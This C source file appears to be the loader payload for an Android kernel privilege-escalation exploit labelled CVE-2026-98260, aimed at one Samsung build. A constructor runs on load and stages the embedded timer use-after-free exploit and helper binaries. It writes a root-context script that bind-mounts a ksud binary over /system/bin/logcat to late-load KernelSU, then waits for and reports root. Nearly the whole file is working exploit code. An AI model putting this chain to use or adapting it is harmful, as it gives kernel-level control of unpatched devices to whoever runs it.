/*
 * pa3q-S938U1UEUDDZJB - CVE-2026-98260 app payload.
 *
 * The exploit itself is the SamTimer chain that was verified on this exact
 * build: timer UAF -> pipe read/write -> fake system_unbound_wq work ->
 * call_usermodehelper -> uhexec -> KSud late-load.  It is kept as a separate
 * standalone binary (cve-2026-98260-timer) because it re-execs
 * /proc/self/exe; inside a dlopen()ed payload that path is the host process,
 * not the exploit.
 *
 * This wrapper is what the app loads.  It stages the embedded timer binary,
 * uhexec and the action script, starts the timer binary in its own session,
 * then waits for the KernelSU module and prints the markers the app reads.
 * The timer process parks by design so its freed page and zombie triggers
 * stay alive; it must not be killed.  A second run in one boot is refused:
 * every failed plant parks, and a retry on that state can panic the kernel.
 */
#define _GNU_SOURCE

#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define WORK_DIR "/data/local/tmp/w"
#define TIMER_PATH WORK_DIR "/libtimer.so"
#define UHEXEC_PATH WORK_DIR "/uhexec"
#define ACTION_PATH WORK_DIR "/umh_action.sh"
#define ACTION_LOG WORK_DIR "/umh-action.log"
#define UHEXEC_LOG WORK_DIR "/uhexec.log"
#define DMESG_LOG WORK_DIR "/dmesg_after_load.log"
#define HOLDER_RECORD WORK_DIR "/rmg-umh-holder"
#define KSUD_PATH "/data/local/tmp/ksud-s25u-kdp"
#define BOOT_ID_PATH "/proc/sys/kernel/random/boot_id"
#define DEFAULT_MANAGER "me.weishu.kernelsu"
#define WAIT_SECONDS 600

extern const unsigned char cve98260_timer_start[];
extern const unsigned char cve98260_timer_end[];
extern const unsigned char cve98260_uhexec_start[];
extern const unsigned char cve98260_uhexec_end[];

static void say(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
}

static int write_full(int fd, const void *buf, size_t len)
{
    const unsigned char *p = buf;

    while (len) {
        ssize_t n = write(fd, p, len);

        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        p += n;
        len -= (size_t)n;
    }
    return 0;
}

static int stage_blob(const char *path, const unsigned char *start,
                      const unsigned char *end, mode_t mode)
{
    size_t len = (size_t)(end - start);
    int fd;

    (void)unlink(path);
    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (fd < 0) {
        say("[rmg] cannot create %s: %s\n", path, strerror(errno));
        return -1;
    }
    if (write_full(fd, start, len)) {
        say("[rmg] cannot write %s: %s\n", path, strerror(errno));
        close(fd);
        return -1;
    }
    if (fchmod(fd, mode))
        say("[rmg] chmod %s: %s\n", path, strerror(errno));
    close(fd);
    say("[rmg] staged %s (%zu bytes)\n", path, len);
    return 0;
}

static int write_text(const char *path, const char *text, size_t len,
                      mode_t mode)
{
    int fd;

    (void)unlink(path);
    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (fd < 0) {
        say("[rmg] cannot create %s: %s\n", path, strerror(errno));
        return -1;
    }
    if (write_full(fd, text, len)) {
        say("[rmg] cannot write %s: %s\n", path, strerror(errno));
        close(fd);
        return -1;
    }
    if (fchmod(fd, mode))
        say("[rmg] chmod %s: %s\n", path, strerror(errno));
    close(fd);
    return 0;
}

static const char *manager_package(void)
{
    const char *pkg = getenv("CVE98260_KSU_PACKAGE");
    const char *c;

    if (!pkg || !*pkg)
        return DEFAULT_MANAGER;
    for (c = pkg; *c; c++)
        if (!isalnum((unsigned char)*c) && *c != '.' && *c != '_')
            return DEFAULT_MANAGER;
    return pkg;
}

static int write_action(const char *pkg)
{
    char script[4096];
    int n = snprintf(
        script, sizeof(script),
        "#!/system/bin/sh\n"
        "exec >%s 2>&1\n"
        "echo \"start uid=$(id -u) ctx=$(cat /proc/self/attr/current "
        "2>/dev/null) enforce=$(getenforce 2>/dev/null)\"\n"
        "unshare -m sh -c '\n"
        "  mount --bind %s /system/bin/logcat || { echo mount_failed; "
        "exit 11; }\n"
        "  echo \"bind mounted kdp\"\n"
        "  /system/bin/logcat --version\n"
        "  /system/bin/logcat late-load --allow-shell --package-name %s\n"
        "  echo \"late_rc=$?\"\n"
        "'\n"
        "echo \"outer_rc=$?\"\n"
        "grep -i kernelsu /proc/modules 2>/dev/null || echo no-module\n"
        "dmesg | tail -n 4000 > %s 2>&1\n",
        ACTION_LOG, KSUD_PATH, pkg, DMESG_LOG);

    if (n < 0 || (size_t)n >= sizeof(script)) {
        say("[rmg] action script too long\n");
        return -1;
    }
    if (write_text(ACTION_PATH, script, (size_t)n, 0755))
        return -1;
    say("[rmg] staged %s (manager=%s)\n", ACTION_PATH, pkg);
    return 0;
}

static int read_boot_id(char *out, size_t size)
{
    FILE *f = fopen(BOOT_ID_PATH, "r");

    if (!f)
        return -1;
    if (!fgets(out, (int)size, f)) {
        fclose(f);
        return -1;
    }
    fclose(f);
    out[strcspn(out, "\r\n")] = 0;
    return out[0] ? 0 : -1;
}

static int process_is_timer(pid_t pid)
{
    char path[64], comm[32];
    FILE *f;

    snprintf(path, sizeof(path), "/proc/%d/comm", (int)pid);
    f = fopen(path, "r");
    if (!f)
        return 0;
    if (!fgets(comm, sizeof(comm), f)) {
        fclose(f);
        return 0;
    }
    fclose(f);
    comm[strcspn(comm, "\r\n")] = 0;
    return strcmp(comm, "libtimer.so") == 0;
}

/*
 * Refuse a second attempt in one boot.  The timer chain parks on every path
 * that has already freed a slab; starting another plant over that state is
 * what turns a failed attempt into a panic.  The record carries the boot id
 * so a stale pid from a previous boot can never be mistaken for a holder.
 */
static int holder_from_this_boot(void)
{
    char current[64], recorded[64];
    unsigned long pid;
    FILE *f;

    if (read_boot_id(current, sizeof(current)))
        return 0;
    f = fopen(HOLDER_RECORD, "r");
    if (!f)
        return 0;
    if (fscanf(f, "%63s %lu", recorded, &pid) != 2) {
        fclose(f);
        return 0;
    }
    fclose(f);
    if (strcmp(recorded, current) != 0 || pid <= 1)
        return 0;
    if (kill((pid_t)pid, 0) != 0 && errno == ESRCH)
        return 0;
    if (!process_is_timer((pid_t)pid))
        return 0;
    say("[rmg] timer holder pid=%lu from this boot is still alive; "
        "reboot before another attempt\n", pid);
    return 1;
}

static void record_holder(pid_t pid)
{
    char boot[64];
    FILE *f;

    if (read_boot_id(boot, sizeof(boot)))
        snprintf(boot, sizeof(boot), "unknown");
    f = fopen(HOLDER_RECORD, "w");
    if (!f) {
        say("[rmg] cannot record holder: %s\n", strerror(errno));
        return;
    }
    fprintf(f, "%s %d\n", boot, (int)pid);
    fclose(f);
}

static int module_live(void)
{
    char line[512];
    FILE *f = fopen("/proc/modules", "r");

    if (!f)
        return 0;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "kernelsu ", 9) == 0) {
            fclose(f);
            return 1;
        }
    }
    fclose(f);
    return 0;
}

static int prepare_work_dir(void)
{
    struct stat st;

    if (stat(WORK_DIR, &st) == 0) {
        if (!S_ISDIR(st.st_mode)) {
            say("[rmg] %s is not a directory\n", WORK_DIR);
            return -1;
        }
        return 0;
    }
    if (mkdir(WORK_DIR, 0755) && errno != EEXIST) {
        say("[rmg] cannot create %s: %s\n", WORK_DIR, strerror(errno));
        return -1;
    }
    return 0;
}

static int run_supervisor(void)
{
    const char *pkg = manager_package();
    pid_t pid;
    int seconds;

    say("[rmg] CVE-2026-98260 timer payload (DDZJB)\n");
    if (module_live()) {
        say("[rmg] KernelSU is already live; reboot before running this "
            "payload\n");
        return 1;
    }
    if (holder_from_this_boot())
        return 1;
    if (prepare_work_dir())
        return 1;

    (void)unlink(ACTION_LOG);
    (void)unlink(UHEXEC_LOG);
    (void)unlink(DMESG_LOG);

    if (access(KSUD_PATH, X_OK) != 0) {
        say("[rmg] KSud is not staged at %s: %s\n", KSUD_PATH,
            strerror(errno));
        return 1;
    }

    if (stage_blob(TIMER_PATH, cve98260_timer_start, cve98260_timer_end,
                   0755) ||
        stage_blob(UHEXEC_PATH, cve98260_uhexec_start,
                   cve98260_uhexec_end, 0755) ||
        write_action(pkg))
        return 1;

    pid = fork();
    if (pid < 0) {
        say("[rmg] fork: %s\n", strerror(errno));
        return 1;
    }
    if (pid == 0) {
        if (setsid() < 0)
            say("[rmg] setsid: %s\n", strerror(errno));
        execl(TIMER_PATH, TIMER_PATH, "umhpipe", (char *)NULL);
        say("[rmg] exec %s: %s\n", TIMER_PATH, strerror(errno));
        _exit(127);
    }

    record_holder(pid);
    say("[rmg] timer holder pid=%d; waiting for the module\n", (int)pid);

    for (seconds = 0; seconds < WAIT_SECONDS; seconds++) {
        int status = 0;
        pid_t waited;

        if (module_live()) {
            say("[rmg] kernelsu module live\n");
            say("CVE98260_APP_ROOT_PROOF module=kernelsu holder=%d\n",
                (int)pid);
            say("done=1 root=1\nexploit completed\n");
            return 0;
        }
        waited = waitpid(pid, &status, WNOHANG);
        if (waited == pid) {
            say("[rmg] timer process exited before the module loaded "
                "(status=0x%x)\n", status);
            return 1;
        }
        if (seconds && seconds % 10 == 0)
            say("[rmg] waiting for the module (%ds)\n", seconds);
        sleep(1);
    }

    say("[rmg] CVE98260_APP_FAIL module did not load within %ds; timer "
        "holder pid=%d left parked (reboot to clear)\n",
        WAIT_SECONDS, (int)pid);
    return 1;
}

__attribute__((constructor)) static void cve98260_payload(void)
{
    static int started;

    if (started)
        return;
    started = 1;
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    if (run_supervisor() != 0)
        _exit(1);
}
